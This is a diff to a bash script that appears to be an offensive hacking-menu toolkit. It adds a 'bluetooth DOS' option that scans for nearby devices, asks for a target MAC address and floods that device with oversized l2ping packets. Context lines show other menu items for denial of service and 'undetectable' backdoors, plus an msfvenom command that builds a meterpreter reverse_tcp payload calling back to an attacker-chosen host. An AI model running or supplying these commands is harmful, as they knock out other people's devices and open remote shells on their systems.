@@ -89,8 +89,8 @@ echo '  [+] denial of service : dos        | [+] backdoor undetectable : bacd  '
 echo '  ---------------------------------------------------------------------  '
 echo '  [+] retrival of handshake : rtvh   | [+] update                        '
 echo '  ---------------------------------------------------------------------  '
-echo '  [+] install dependances : ind         '
-echo '  ------------------------------------  '
+echo '  [+] install dependances : ind      | [+] bluetooth DOS : bdos          '
+echo '  ---------------------------------------------------------------------  '
 
 fi
 
@@ -343,10 +343,33 @@ msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd -a x86 lport=$portbd > $
 fi
 
 
-
-
-
 fi
+
+
+
+
+
+if [ $choix = "bdos" ]
+then
+echo
+echo
+echo
+echo
+echo
+echo  --------------------------
+echo  -    bluetooth attack    -
+echo  --------------------------
+echo
+echo
+hictool scan
+echo
+echo
+echo
+read -p 'mac address : ' macbdos
+xterm -title bluetooth-DOS -e l2ping -s 10000 $macbdos
+fi
+
+
 
 
 if [ $choix = "update" ]
